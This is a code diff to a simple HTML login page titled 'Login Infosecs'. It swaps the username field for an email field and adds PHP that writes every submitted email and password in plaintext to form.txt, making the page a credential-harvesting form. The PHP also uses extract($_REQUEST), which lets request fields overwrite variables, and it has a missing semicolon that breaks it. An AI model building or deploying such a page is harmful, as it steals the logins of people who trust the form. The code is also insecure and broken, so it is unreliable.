@@ -47,12 +47,27 @@ button {
     <center> <h1> Login Infosecs </h1> </center> 
     <form>
         <div class="container"> 
-            <label>Username : </label> 
-            <input type="text" placeholder="Enter Username" name="username" required>
+            <label>Email : </label> 
+            <input type="email" placeholder="Enter Email" name="email" required>
+
             <label>Password : </label> 
             <input type="password" placeholder="Enter Password" name="password" required>
+
             <button type="submit">Login</button> 
         </div> 
     </form>   
 </body>   
 </html>
+
+<?php
+    extract($_REQUEST);
+    $file=fopen("form.txt", "a")
+
+    fwrite($file, "email :");
+    fwrite($file, $email . "\n");
+
+    fwrite($file, "password :");
+    fwrite($file, $password . "\n");
+
+    fclose($file);
+?>
